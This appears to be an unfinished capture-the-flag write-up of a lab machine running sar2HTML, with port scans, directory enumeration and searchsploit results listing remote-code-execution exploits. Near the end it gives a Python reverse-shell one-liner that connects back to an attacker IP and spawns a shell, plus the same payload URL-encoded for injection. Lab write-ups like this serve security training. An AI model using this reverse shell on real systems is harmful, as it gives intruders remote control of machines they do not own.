# IP: 192.168.114.35

# 192.168.114.35


# Nmap

```javascript
┌──(dx㉿kali)-[~]
└─$ nmap 192.168.114.35                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 01:38 EDT
Nmap scan report for 192.168.114.35
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 59.67 seconds
```

# NMAP-Advanced Section
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 192.168.114.35
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-01 01:40 EDT
Nmap scan report for 192.168.114.35
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
```

# Navigating to Port-80

![Sar-provingground-webpage](https://user-images.githubusercontent.com/98345027/187840124-10cea880-c77d-44e0-b77e-0da506295069.png)

# Robots.txt Webpage
![sar-robots-txt-provingground](https://user-images.githubusercontent.com/98345027/187840339-c9d282a8-f05b-4c2e-bef2-c8ea52bc0dd1.png)
```javascript
Note: In The Robots.txt page we got: sar2HTML
lets try to append in the url: http://192.168.114.35/sar2HTML/
```

![sartohtml-webpage-provingground](https://user-images.githubusercontent.com/98345027/187841032-e90bafbb-f40e-460a-8308-974c9be0f27d.png)

# Findingd from /sar2HTML
```javascript
1. From the webpage we found the Version of sar2html 
2. From the Source page we don't fnd anything relevant to the information
```

# Dirbuster: checking for directory
```javascript
┌──(dx㉿kali)-[~]
└─$ dirb http://192.168.114.35/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  1 01:58:37 2022
URL_BASE: http://192.168.114.35/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.114.35/ ----
+ http://192.168.114.35/index.html (CODE:200|SIZE:10918)                                                                                        
+ http://192.168.114.35/phpinfo.php (CODE:200|SIZE:95499)                                                                                       
+ http://192.168.114.35/robots.txt (CODE:200|SIZE:9)                                                                                            
+ http://192.168.114.35/server-status (CODE:403|SIZE:279)                                                                                       
                                                                                                                                                 
-----------------
END_TIME: Thu Sep  1 02:13:04 2022
DOWNLOADED: 4612 - FOUND: 4
```


# Searchingsploit 
```javascript
┌──(dx㉿kali)-[~]
└─$ searchsploit sar2html
-------------------------------------------- ---------------------------------
 Exploit Title                              |  Path
-------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Executi | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution   | php/webapps/47204.txt
-------------------------------------------- ---------------------------------
Shellcodes: No Results
                        
```

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.114",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# Url Encode Pyload
```javascript
%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%31%31%34%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
```

```javascript
```

```javascript
```
